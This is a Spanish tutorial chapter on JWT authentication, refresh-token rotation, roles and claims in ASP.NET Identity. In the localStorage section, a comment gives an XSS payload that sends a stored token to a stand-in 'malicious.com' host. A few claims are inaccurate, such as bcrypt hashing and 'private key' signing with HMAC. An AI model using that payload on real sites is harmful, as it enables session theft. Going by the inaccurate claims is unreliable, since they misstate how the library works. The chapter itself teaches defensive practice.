---
sidebar_position: 3
title: JWT + Identity
description: Autenticación, autorización, roles, claims y refresh tokens — basado en el video G18.
---

# JWT + Identity

Escúchame. La autenticación es donde la mayoría del código cae.

No porque sea difícil. Sino porque hay decisiones que parecen simples y terminan con tokens robados, sesiones explotadas, y tu jefe preguntando por qué un usuario de 15 años está cambiando permisos en tu DB.

Este capítulo es el mundo real. Código que funciona en producción.

**Video de referencia:** [G18 — Permisos y roles: cómo diseñar auth sin que explote todo](https://youtube.com/@anndev14)

---

## El problema — sin autenticación

```csharp
[HttpPost("create-order")]
public async Task<ActionResult<Order>> CreateOrder(CreateOrderDto dto)
{
    // ¿Quién eres tú?
    // ¿Puedes hacer esto?
    // ¿Eres admin o empleado?
    // No sé. No importa. ADELANTE.

    var order = new Order { /* ... */ };
    await _unitOfWork.Repository<Order>().Add(order);
    await _unitOfWork.Complete();
    return Ok(order);
}
```

Cualquiera que acceda a ese endpoint puede:
- Crear órdenes con precios negativos
- Cambiar al dueño de la orden
- Acceder a órdenes de otros usuarios
- Eliminar datos

*Sin autenticación, tu API es un cajero automático abierto.*

---

## JWT vs Sesiones — la decisión

**Sesiones (tradicional):**

```
Cliente: "Soy Anderson"
    ↓
Servidor: "OK, eres la sesión ABC123"
          [Guarda ABC123 en memoria: {user: Anderson, roles: [Admin]})
    ↓
Cliente envía ABC123 en cada request
    ↓
Servidor busca ABC123 en memoria
    ↓
"Sí, eres Anderson"
```

**Problemas:**
- Si tienes 10 servidores, necesitas sesiones compartidas (Redis)
- Cada request busca en la DB o en caché
- No escala bien en microservicios
- Difícil de revocar — necesitas borrar la sesión en todas partes

**JWT (tokens):**

```
Cliente: "Soy Anderson, Admin, email@test.com, expires 2025-12-20"
         [Firmado con llave privada del servidor]
    ↓
Servidor: "Voy a verificar que está firmado correctamente"
    ↓
"Sí, es auténtico. Confío en el contenido"
    ↓
No guardo nada. El cliente trae toda la info.
```

**Ventajas:**
- Sin estado en el servidor (stateless)
- Escala fácil
- Funciona en microservicios
- El token contiene toda la info

**Desventajas:**
- No puedo revocar un token (problema)
- El token no cambia hasta expirar
- Más grande que una cookie de sesión

**La solución:** JWT corto + Refresh Token largo.

---

## El flujo — dos enfoques

### Enfoque 1: JWT de 7 días (sin refresh)

*Simplista pero funcional para startups pequeñas.*

```csharp
public async Task<string> CreateToken(AppUser user)
{
    var claims = new List<Claim>
    {
        new Claim(ClaimTypes.NameIdentifier, user.Id),
        new Claim(ClaimTypes.Email, user.Email ?? ""),
        new Claim(ClaimTypes.Name, user.UserName ?? ""),
    };

    var roles = await _userManager.GetRolesAsync(user);
    foreach (var role in roles.Distinct())
    {
        claims.Add(new Claim(ClaimTypes.Role, role));
    }

    var creds = new SigningCredentials(_key, SecurityAlgorithms.HmacSha512Signature);
    var tokenDescriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(claims),
        Expires = DateTime.UtcNow.AddDays(7), // 👈 7 días sin refresh
        SigningCredentials = creds,
        Issuer = _config["Token:Issuer"],
        Audience = _config["Token:Audience"]
    };

    var tokenHandler = new JwtSecurityTokenHandler();
    var token = tokenHandler.CreateToken(tokenDescriptor);

    return tokenHandler.WriteToken(token);
}
```

**Cuándo usar:**
- App pequeña, baja seguridad
- Prototipo
- Cuando "revocación" no es crítica

**Cuándo NO:**
- App médica, financiera, o sensible
- Muchos usuarios
- Si alguien roba el token, vive 7 días

### Enfoque 2: JWT corto + Refresh Token (profesional)

*La forma que usa el mundo real.*

```csharp
// JWT vive 60 minutos
Expires = DateTime.UtcNow.AddMinutes(60)

// RefreshToken vive 7 días
public static RefreshToken Create(Guid userId, int expirationDays = 7)
{
    return new RefreshToken
    {
        Token = Convert.ToBase64String(Guid.NewGuid().ToByteArray()) +
                Convert.ToBase64String(Guid.NewGuid().ToByteArray()),
        UserId = userId,
        ExpiresAt = DateTime.UtcNow.AddDays(expirationDays),
        CreatedAt = DateTime.UtcNow,
        IsRevoked = false
    };
}
```

**El flujo:**

```
POST /auth/login → email + password
    ↓
Valida credenciales
    ↓
Crea JWT (60 min) + RefreshToken (7 días)
    ↓
Response: { jwt, refreshToken, expiresIn: 3600 }
    ↓
Cliente guarda ambos
    ↓
Cliente usa JWT en cada request (Header: "Authorization: Bearer <JWT>")
    ↓
En 60 minutos, JWT expira
    ↓
Cliente envía RefreshToken a POST /auth/refresh
    ↓
Servidor valida RefreshToken
    ↓
Genera JWT nuevo + RefreshToken nuevo (rotation)
    ↓
Revoca RefreshToken viejo
    ↓
Cliente actualiza ambos
```

*Sin que el usuario tenga que loguear de nuevo.*

---

## Las entidades — `AppUser` y `RefreshToken`

```csharp
public class AppUser : IdentityUser<Guid>
{
    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public Guid? TenantId { get; set; }
    public bool IsActive { get; set; } = true;
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public DateTime? LastLoginAt { get; set; }

    public string FullName => $"{FirstName} {LastName}";

    public void RecordLogin()
    {
        LastLoginAt = DateTime.UtcNow;
    }
}
```

`IdentityUser<Guid>` es la clase base de ASP.NET Identity. Ya tiene `Id`, `Email`, `PasswordHash`, `PhoneNumber`, etc.

`TenantId` es para multi-tenancy — cada usuario pertenece a un tenant (una clínica, una empresa). Si tu app no es multi-tenant, quítalo.

```csharp
public class RefreshToken
{
    public Guid Id { get; private set; } = Guid.NewGuid();
    public string Token { get; private set; } = null!;
    public Guid UserId { get; private set; }
    public DateTime ExpiresAt { get; private set; }
    public DateTime CreatedAt { get; private set; }
    public bool IsRevoked { get; private set; }
    public string? RevokedReason { get; private set; }

    // Propiedades calculadas
    public bool IsExpired => DateTime.UtcNow >= ExpiresAt;
    public bool IsActive => !IsRevoked && !IsExpired;

    public static RefreshToken Create(Guid userId, int expirationDays = 7)
    {
        return new RefreshToken
        {
            Token = Convert.ToBase64String(Guid.NewGuid().ToByteArray()) +
                    Convert.ToBase64String(Guid.NewGuid().ToByteArray()),
            UserId = userId,
            ExpiresAt = DateTime.UtcNow.AddDays(expirationDays),
            CreatedAt = DateTime.UtcNow,
            IsRevoked = false
        };
    }

    public void Revoke(string reason = "Manually revoked")
    {
        IsRevoked = true;
        RevokedReason = reason;
    }
}
```

**Por qué esta estructura:**

`IsActive` es una propiedad calculada que verifica si el token **aún sirve**. No confundir con `IsRevoked`:
- `IsRevoked = true` → alguien lo borró explícitamente
- `IsExpired = true` → pasó la fecha
- `IsActive = false` → si cualquiera de los dos es true

---

## Program.cs — el armado

```csharp
public static class AplicationServicesExtensions
{
    public static IServiceCollection AddApplicationServices(
        this IServiceCollection services, IConfiguration config)
    {
        // DbContext
        services.AddDbContext<AppContext>(opt =>
        {
            opt.UseSqlServer(config.GetConnectionString("DefaultConnection"));
        });

        // Identity — las reglas de contraseña
        services.AddIdentity<AppUser, AppRole>(opt =>
                {
                    opt.User.RequireUniqueEmail = true;
                    opt.SignIn.RequireConfirmedEmail = true;
                    opt.Password.RequireDigit = true;
                    opt.Password.RequireNonAlphanumeric = true;
                    opt.Password.RequireUppercase = true;
                    opt.Password.RequireLowercase = true;
                    opt.Password.RequiredLength = 8;
                }
            )
            .AddEntityFrameworkStores<AppContext>()
            .AddDefaultTokenProviders();

        return services;
    }
}
```

### Línea por línea

```csharp
opt.User.RequireUniqueEmail = true;
```

No puede haber dos usuarios con el mismo email. Point.

```csharp
opt.SignIn.RequireConfirmedEmail = true;
```

Hasta que no confirmen el email, no pueden loguear. Extra seguro.

```csharp
opt.Password.RequireDigit = true;
opt.Password.RequireNonAlphanumeric = true;
opt.Password.RequireUppercase = true;
opt.Password.RequireLowercase = true;
opt.Password.RequiredLength = 8;
```

Contraseña debe tener al menos 8 caracteres, números, símbolos, mayúsculas, minúsculas.

*Sí, es restrictivo. Sí, los usuarios van a quejarse. Sí, está bien.*

```csharp
.AddEntityFrameworkStores<AppContext>()
.AddDefaultTokenProviders();
```

Le dices a Identity dónde guardar los usuarios (EF Core) y que use los token providers predeterminados.

---

## Authentication + Authorization — el middleware

```csharp
services.AddAuthentication(opt =>
{
    opt.DefaultAuthenticateScheme =
        opt.DefaultChallengeScheme =
            opt.DefaultForbidScheme =
                opt.DefaultScheme =
                    opt.DefaultSignInScheme =
                        opt.DefaultSignOutScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(opt =>
{
    opt.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = config["Token:Issuer"],
        ValidateAudience = true,
        ValidAudience = config["Token:Audience"],
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(
            System.Text.Encoding.UTF8.GetBytes(config["Token:Key"])
        ),
        ValidateLifetime = true,
        ClockSkew = TimeSpan.Zero,
    };
});

services.AddAuthorization(opt =>
{
    opt.AddPolicy("RequireAdmin",
        policy => policy.RequireRole(RoleNames.Admin));
    opt.AddPolicy("RequireManager",
        policy => policy.RequireRole(RoleNames.Manager));
    opt.AddPolicy("RequireEmployeeOrManager",
        policy => policy.RequireRole(RoleNames.Manager, RoleNames.Employee));
});
```

### Qué significa cada línea

```csharp
ValidateIssuer = true,
ValidIssuer = config["Token:Issuer"],
```

El token debe decir quién lo emitió. Si tu app dice "emitido por api.mediflow.com" y alguien manda un token que dice "emitido por malicious.com", lo rechazas.

```csharp
ValidateAudience = true,
ValidAudience = config["Token:Audience"],
```

El token debe estar dirigido a TI. Un token emitido para otra app no sirve en la tuya.

```csharp
ValidateIssuerSigningKey = true,
IssuerSigningKey = new SymmetricSecurityKey(
    System.Text.Encoding.UTF8.GetBytes(config["Token:Key"])
),
```

**Crítico.** La misma llave que **firmó** el token es la que **valida**. Si alguien cambió el token sin la llave privada, la validación falla.

```csharp
ValidateLifetime = true,
ClockSkew = TimeSpan.Zero,
```

Verifica que el token no expiró. `ClockSkew = TimeSpan.Zero` significa "sin tolerancia". Si expira a las 3:00:00, a las 3:00:01 es inválido.

*Algunos dejan ClockSkew de 60 segundos para tolerar desincronización de relojes. Depende de cuánto confíes en la sincronización de servidores.*

---

## El controller — autenticación

```csharp
[HttpPost("login")]
[AllowAnonymous]
public async Task<ActionResult<AuthResponse>> Login(
    [FromBody] LoginRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);
    if (user is null)
        throw new UnauthorizedException("Invalid credentials");

    if (!user.IsActive)
        throw new UnauthorizedException("Account is inactive");

    var result = await _signInManager.CheckPasswordSignInAsync(
        user, request.Password, lockoutOnFailure: false);

    if (!result.Succeeded)
        throw new UnauthorizedException("Invalid credentials");

    user.RecordLogin();
    await _userManager.UpdateAsync(user);

    var roles = await _userManager.GetRolesAsync(user);
    return Ok(await BuildAuthResponseAsync(user, roles));
}
```

### Línea por línea

```csharp
[AllowAnonymous]
```

Este endpoint puede ser accedido sin token. Lógico — si necesitas un token para loguear, nunca loguas.

```csharp
var user = await _userManager.FindByEmailAsync(request.Email);
if (user is null)
    throw new UnauthorizedException("Invalid credentials");
```

Busca el usuario por email. Si no existe, lanza excepción. **Nota:** el mensaje es ambiguo ("Invalid credentials"). NO dices "usuario no existe" — eso le dice al attacker que ese email está registrado.

```csharp
if (!user.IsActive)
    throw new UnauthorizedException("Account is inactive");
```

Un admin puede desactivar cuentas sin borrarlas. Práctico para auditoría.

```csharp
var result = await _signInManager.CheckPasswordSignInAsync(
    user, request.Password, lockoutOnFailure: false);
```

`CheckPasswordSignInAsync` valida la contraseña **hasheada** contra la que el usuario pasó. Nunca guardas la contraseña en plain text. Identity usa bcrypt por defecto.

```csharp
user.RecordLogin();
await _userManager.UpdateAsync(user);
```

Registra cuándo fue el último login. Útil para auditoría y detección de fraude.

---

## El refresh token — mantener la sesión viva

```csharp
[HttpPost("refresh")]
[AllowAnonymous]
public async Task<ActionResult<AuthResponse>> Refresh(
    [FromBody] RefreshTokenRequest request)
{
    var refreshToken = await _context.RefreshTokens
        .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);

    if (refreshToken is null)
        throw new UnauthorizedException("Invalid refresh token");

    if (!refreshToken.IsActive)
    {
        var reason = refreshToken.IsRevoked ? "Token has been revoked" : "Token has expired";
        throw new UnauthorizedException(reason);
    }

    var user = await _userManager.FindByIdAsync(refreshToken.UserId.ToString());
    if (user is null || !user.IsActive)
        throw new UnauthorizedException("User not found or inactive");

    // Revocar el token actual y generar uno nuevo (rotation)
    refreshToken.Revoke("Replaced by new token");
    await _context.SaveChangesAsync();

    var roles = await _userManager.GetRolesAsync(user);
    return Ok(await BuildAuthResponseAsync(user, roles));
}
```

### El flujo

1. Cliente manda RefreshToken
2. Buscas el token en la DB
3. Verificas que está activo (no revocado, no expirado)
4. Verificas que el usuario existe y está activo
5. Revocas el RefreshToken viejo
6. Generas JWT nuevo + RefreshToken nuevo
7. Cliente guarda ambos

**Rotation de tokens:** Cada vez que usa RefreshToken, genera uno nuevo. Si alguien robó el token viejo, ya no sirve después de que lo uses.

---

## Revocación manual

```csharp
[HttpPost("revoke")]
[Authorize]
public async Task<IActionResult> Revoke(
    [FromBody] RevokeTokenRequest request)
{
    var refreshToken = await _context.RefreshTokens
        .FirstOrDefaultAsync(x => x.Token == request.RefreshToken);

    if (refreshToken is null)
        throw new NotFoundException("Refresh token not found");

    if (!refreshToken.IsActive)
        throw new DomainException("Token is already inactive");

    var currentUserId = User.FindFirstValue(ClaimTypes.NameIdentifier);
    var isAdmin = User.IsInRole(RoleNames.Admin);

    // Puedes revocar tu propio token O ser admin
    if (refreshToken.UserId.ToString() != currentUserId && !isAdmin)
        throw new UnauthorizedException("You cannot revoke this token");

    refreshToken.Revoke("Manually revoked");
    await _context.SaveChangesAsync();

    return NoContent();
}
```

**Control de acceso:** Solo tú puedes revocar tu token, o un admin puede revocar cualquiera.

---

## Roles y Policies

### Definir roles (en la DB, una sola vez)

```csharp
public class AppRoleConfiguration : IEntityTypeConfiguration<AppRole>
{
    public void Configure(EntityTypeBuilder<AppRole> builder)
    {
        var roles = new List<AppRole>()
        {
            new AppRole 
            { 
                Id = "b9bcdce5-1080-4dfb-a4d9-a8f64867f055", 
                Name = "Admin", 
                NormalizedName = "ADMIN",
                Description = "Global System Administrator (access to all tenants)"
            },
            new AppRole 
            { 
                Id = "d25edb8a-ff80-4aab-b859-6e0190eec8e3", 
                Name = "Manager", 
                NormalizedName = "MANAGER",
                Description = "Manager with limited permissions per tenant"
            },
            new AppRole 
            { 
                Id = "fe3bafcd-101b-4a2e-b69a-89356b5d0f92", 
                Name = "Employee", 
                NormalizedName = "EMPLOYEE",
                Description = "Employee with limited permissions by area"
            }
        };
        builder.HasData(roles);
    }
}
```

### Usar roles en el controller

```csharp
[HttpDelete("{id}")]
[Authorize(Roles = "Admin,Manager")]
public async Task<IActionResult> DeleteAppointment(int id)
{
    var appointment = await _unitOfWork.Repository<Appointment>()
        .GetEntityWithSpec(new AppointmentByIdSpec(id));

    if (appointment is null)
        throw new NotFoundException(nameof(Appointment), id);

    _unitOfWork.Repository<Appointment>().Remove(appointment);
    await _unitOfWork.Complete();

    return NoContent();
}
```

**`[Authorize(Roles = "Admin,Manager")]`** — solo Admin o Manager pueden borrar.

### Policies — autorización más compleja

```csharp
// En Program.cs
services.AddAuthorization(opt =>
{
    opt.AddPolicy("RequireAdmin",
        policy => policy.RequireRole(RoleNames.Admin));
    
    opt.AddPolicy("RequireEmployeeOrManager",
        policy => policy.RequireRole(RoleNames.Manager, RoleNames.Employee));
    
    // Policy personalizada
    opt.AddPolicy("OwnResourceOrAdmin", policy =>
        policy.RequireAssertion(context =>
        {
            var userId = context.User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
            var resourceOwnerId = context.Resource as string; // El resource viene del controller
            var isAdmin = context.User.IsInRole(RoleNames.Admin);

            return userId == resourceOwnerId || isAdmin;
        }));
});
```

**Nota sobre `context.Resource`:** en la práctica, cuando usas `[Authorize(Policy = "...")]`, `context.Resource` es el `HttpContext`, no tu recurso. Para policy basada en el dueño del recurso, la forma limpia es usar un `IAuthorizationHandler` con un requirement propio — o, como en el ejemplo siguiente, verificar el dueño dentro del controller.

En el controller:

```csharp
[HttpGet("{id}")]
[Authorize]
public async Task<ActionResult<AppointmentDto>> GetAppointment(int id)
{
    var appointment = await _unitOfWork.Repository<Appointment>()
        .GetEntityWithSpec(new AppointmentByIdSpec(id));

    if (appointment is null)
        throw new NotFoundException(nameof(Appointment), id);

    // Solo tu propia cita o si eres admin
    if (appointment.PatientId != _currentUser.Id && !User.IsInRole(RoleNames.Admin))
        throw new UnauthorizedException("You cannot access this appointment");

    return Ok(mapper.Map<AppointmentDto>(appointment));
}
```

---

## Claims — más allá de roles

```csharp
public async Task<string> CreateToken(AppUser user)
{
    var claims = new List<Claim>
    {
        new Claim(ClaimTypes.NameIdentifier, user.Id),        // Sub
        new Claim(ClaimTypes.Email, user.Email ?? ""),
        new Claim(ClaimTypes.Name, user.UserName ?? ""),
        new Claim("FullName", user.FullName),                 // Custom claim
        new Claim("TenantId", user.TenantId.ToString()),       // Custom claim
        new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
    };

    var roles = await _userManager.GetRolesAsync(user);
    foreach (var role in roles.Distinct())
    {
        claims.Add(new Claim(ClaimTypes.Role, role));
    }

    // ... signing logic ...
}
```

En el controller, accedes a los claims:

```csharp
var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
var email = User.FindFirstValue(ClaimTypes.Email);
var fullName = User.FindFirstValue("FullName");
var tenantId = User.FindFirstValue("TenantId");
```

**Diferencia roles vs claims:**

- **Roles:** categorías amplias (Admin, Manager, Employee)
- **Claims:** información específica (TenantId, DepartmentId, Permissions)

Un usuario puede tener múltiples roles. Los claims son datos que necesitas para ejecutar lógica de negocio.

---

## httpOnly Cookies vs localStorage

### localStorage (vulnerable pero conveniente)

```javascript
// En el navegador
localStorage.setItem('token', jwt);

// Problema: JavaScript puede leerlo
// Attacker hace: eval(localStorage.token) y lo obtiene
// O con XSS: <img src=x onerror="fetch('https://malicious.com/steal?token=' + localStorage.token)">
```

### httpOnly Cookies (más seguro)

```csharp
Response.Cookies.Append("token", jwt, new CookieOptions
{
    HttpOnly = true,        // JavaScript NO puede leer esta cookie
    Secure = true,          // Solo viaja por HTTPS
    SameSite = SameSiteMode.Strict, // Evita CSRF
    Expires = DateTimeOffset.UtcNow.AddMinutes(60)
});
```

**Ventajas:**
- JavaScript no puede acceder (protege contra XSS)
- El navegador la envía automáticamente en cada request
- No tienes que guardarla en código

**Desventajas:**
- CSRF es un riesgo (mitigado con SameSite)
- No funciona bien con CORS (cross-origin)

**La decisión:** Para apps SPA modernas, localStorage es práctico. Para máxima seguridad, httpOnly cookies + CSRF tokens.

---

## El primer usuario — quién tiene qué rol

```csharp
var isFirstUser = !await _userManager.Users.AnyAsync();

var role = isFirstUser ? "Admin" : "Employee";
var roleResult = await userManager.AddToRoleAsync(appUser, role);
```

El primer usuario que se registra es Admin automáticamente. Los demás empiezan como Employee.

*En la práctica, esto es inseguro. Mejor:*

```csharp
var isFirstUser = !await _userManager.Users.AnyAsync();

if (isFirstUser)
{
    // Requiere aprobación manual
    _logger.LogWarning("First user registered, pending admin approval");
    await _emailService.NotifyAdminsAsync(appUser.Email);
    // No asignas rol automáticamente
}
else
{
    // Usuarios normales
    await userManager.AddToRoleAsync(appUser, "Employee");
}
```

---

## Orden del middleware en Program.cs

```csharp
var app = builder.Build();

app.UseMiddleware<ExceptionMiddleware>();           // 1. Primero
app.UseStatusCodePagesWithReExecute("/errors/{0}");

if (app.Environment.IsDevelopment()) app.MapOpenApi();

app.UseHttpsRedirection();                            // 2. HTTPS

app.UseAuthentication();                              // 3. ¿Quién eres?
app.UseAuthorization();                               // 4. ¿Puedes hacer esto?

app.UseMiddleware<TenantResolver>();                 // 5. Tenant específico

app.MapControllers();

app.Run();
```

**Orden crítico:**

- `ExceptionMiddleware` primero (atrapa todo)
- `Authentication` antes de `Authorization` (no puedes autorizar sin autenticar)
- `TenantResolver` después (necesita el user autenticado)

---

## El resumen honesto

JWT + Identity es:

**"El usuario se loguea, le das un token firmado, él lo guarda, lo envía en cada request, tú lo verificas sin tocar la DB, y si expira, usa el refresh token para uno nuevo sin loguear de nuevo."**

- Stateless (escalable)
- Seguro si lo haces bien
- Auditable (tokens revocados quedan en la DB)
- Estándar (JWT se entiende en cualquier lado)

Lo que duele:

- Si robas un JWT, vives 60 minutos con acceso
- Si robas ambos (JWT + RefreshToken), vives 7 días
- Si un usuario lo roba, necesitas revocación manual
- HTTPS es **obligatorio** (sin él, el token viaja en plain)

*No es perfecto. Pero es lo mejor que tenemos.*

---

## Video complementario

**G18 — Permisos y roles: cómo diseñar auth sin que explote todo**

En ese video muestro:
- El robo de token (localStorage decoding)
- La diferencia 7 días vs 60 min
- La zona gris de las cookies
- Cómo un token no es una contraseña
- Cómo el mismo servidor firma Y valida

---

El siguiente capítulo — FluentValidation — es la evolución natural de la validación que viste en el login: en vez de validaciones esparcidas en cada controller, una librería con reglas declarativas, testeables y por request.